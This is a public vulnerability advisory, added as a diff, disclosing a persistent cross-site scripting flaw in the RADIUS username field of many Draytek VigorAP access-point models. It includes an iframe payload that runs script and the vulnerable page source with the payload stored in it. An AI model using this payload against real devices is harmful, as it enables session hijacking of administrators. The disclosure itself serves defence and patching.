@@ -1,0 +1,147 @@
+# Title: Draytek VigorAP 1000C - Persistent Cross-Site Scripting
+# Author: Vulnerability Laboratory
+# Date: 2020-05-07
+# Vendor: https://www.draytek.com/
+# Software: https://www.draytek.com/products/vigorap-903/
+# CVE: N/A
+
+Document Title:
+===============
+Draytek VigorAP - (RADIUS) Persistent XSS Vulnerability
+
+
+References (Source):
+====================
+https://www.vulnerability-lab.com/get_content.php?id=2244
+
+
+Common Vulnerability Scoring System:
+====================================
+4
+
+
+Product & Service Introduction:
+===============================
+https://www.draytek.com/
+https://www.draytek.com/products/vigorap-903/
+
+
+
+Affected Product(s):
+====================
+Draytek
+[+] VigorAP 1000C | 1.3.2
+[+] VigorAP 700 | 1.11
+[+] VigorAP 710 | 1.2.5
+[+] VigorAP 800 | 1.1.4
+[+] VigorAP 802 | 1.3.2
+[+] VigorAP 810 | 1.2.5
+[+] VigorAP 900 | 1.2.0
+[+] VigorAP 902 | 1.2.5
+[+] VigorAP 903 | 1.3.1
+[+] VigorAP 910C | 1.2.5
+[+] VigorAP 912C | 1.3.2
+[+] VigorAP 918R Series | 1.3.2
+[+] VigorAP 920R Series | 1.3.0
+[+] All other VigorAP Series with Radius Module
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2020-05-07: Public Disclosure (Vulnerability Laboratory)
+
+
+Technical Details & Description:
+================================
+A persistent input validation vulnerability has been discovered in the
+official Draytek VigorAP product series application.
+The vulnerability allows remote attackers to inject own malicious script
+codes with persistent attack vector to compromise
+browser to web-application requests from the application-side.
+
+The persistent input validation web vulnerability is located in the
+username input field of the RADIUS Setting - RADIUS Server
+Configuration module. Remote attackers with limited access are able to
+inject own malicious persistent script codes as username.
+Other privileged user accounts execute on preview of the modules
+context. The request method to inject is POST and the attack
+vector is located on the application-side.
+
+Successful exploitation of the vulnerability results in session
+hijacking, persistent phishing attacks, persistent external
+redirects to malicious source and persistent manipulation of affected
+application modules.
+
+Vulnerable Module(s):
+[+] RADIUS Setting - RADIUS Server Configuration - Users Profile
+
+Vulnerable Input(s):
+[+] Username
+
+
+Proof of Concept (PoC):
+=======================
+The persistent input validation web vulnerabilities can be exploited by
+remote attackers with low privileged user account and low user interaction.
+For security demonstration or to reproduce the security vulnerability
+follow the provided information an steüs below to continue.
+
+
+PoC: Payload
+<iframe src=evil.source onload=alert(document.domain)></iframe>
+
+
+PoC: Vulnerable Source (http:/vigorAP.localhost:50902/home.asp)
+<div class="box">
+<table width="652" cellspacing="1" cellpadding="2">
+<tbody><tr>
+<th id="userName">Username</th>
+<th id="passwd">Password</th>
+<th id="confirmPasswd">Confirm Password</th>
+<th id="configure">Configure</th>
+</tr>
+<tr>
+<td><input maxlength="24" type="text" id="addusr"></td>
+<td><input maxlength="24" type="password" id="addpwd"></td>
+<td><input maxlength="24" type="password" id="addpwdcfm"></td>
+<td><input type="button" id="btnAddUser" value="Add" class="add"
+onclick="addUser()">
+<input type="button" id="btnCancelUser" value="Cancel" class="add"
+onclick="cancelUser()"></td>
+</tr>
+</tbody></table>
+<table class="content" width="652" cellspacing="1" cellpadding="2">
+<tbody id="usersTb">
+<tr>
+<th id="userNo">NO.</th>
+<th id="userNames">Username</th>
+<th id="userSelect">Select</th>
+</tr>
+<tr><td>1</td><td>test</td><td><input type="checkbox"><input
+type="hidden" value="test"></td></tr>
+tr><td>2</td><td><iframe src=evil.source
+onload=alert(document.domain)></iframe></td><td><input type="checkbox">
+<input type="hidden" value="asd"></td></tr></tbody>
+</table>
+<p><input type="button" id="btnDelSelUser" value="Delete Selected"
+class="del" onclick="delSelUser()">
+<input type="button" id="btnDelAllUser" value="Delete All" class="del"
+onclick="delAllUser()">
+</p></div>
+
+
+Reference(s):
+http:/vigorAP.localhost:50902/
+http:/vigorAP.localhost:50902/home.asp
+
+
+Credits & Authors:
+==================
+Vulnerability-Lab -
+https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab
+Benjamin Kunz Mejri -
+https://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
